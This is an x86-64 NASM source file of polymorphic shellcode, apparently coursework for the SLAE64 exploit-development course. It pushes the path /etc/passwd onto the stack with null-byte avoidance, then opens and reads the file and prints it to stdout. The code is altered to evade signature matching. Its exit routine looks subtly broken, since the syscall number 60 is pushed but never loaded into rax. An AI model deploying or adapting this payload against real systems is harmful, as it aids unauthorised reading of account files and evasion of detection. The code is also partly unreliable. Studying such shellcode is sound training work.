; Filename: shellcode3-polymorphic.nasm
; Author: SLAE64-14209

global _start
section .text
_start:

; syscall open file
	
	push 0x01647773               ; 0x01 + dws
  mov rbx, 0x7361702f6374652f   ; sap/cte/
	push rbx
	mov rdi, rsp
	dec byte [rdi + 11]           ; solving null byte issue
  push 2
	pop rax                       ; syscall open = 2
	;xor rsi, rsi                 ; set O_RDONLY flag
  sub rsi, rsi
	syscall
	
; syscall read file
	
	sub sp, 0xfff
  lea rsi, [rsp]
  mov rdi, rax
  xor rdx, rdx
  mov dx, 0xfff                 ; size to read
  xor rax, rax
  syscall

; syscall write to stdout
	;xor rdi, rdi
  ;add dil, 1                   ; set stdout fd = 1
  push 1
	pop rdx
	;mov rdx, rax
  xchg rax, rdx
	push rax
	;xor rax, rax
  ;add al, 1
  pop rdi
	syscall

; syscall exit
	;xor rax, rax
  ;add al, 60
  push 60
	push rax
  syscall
